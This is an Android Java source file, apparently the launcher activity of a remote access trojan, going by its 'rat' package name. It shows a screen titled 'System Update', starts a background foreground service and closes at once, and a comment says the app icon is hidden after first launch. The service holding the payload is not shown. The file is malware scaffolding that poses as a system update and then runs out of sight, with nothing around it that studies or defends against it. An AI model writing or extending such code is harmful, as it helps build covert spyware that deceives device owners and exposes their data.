package com.xroomjx.rat;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.widget.TextView;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        TextView tv = new TextView(this);
        tv.setText("System Update");
        tv.setTextSize(24);
        tv.setPadding(50, 50, 50, 50);
        setContentView(tv);

        // Start background service
        Intent serviceIntent = new Intent(this, MainService.class);
        startForegroundService(serviceIntent);

        // Hide app icon after first launch
        finish();
    }
}
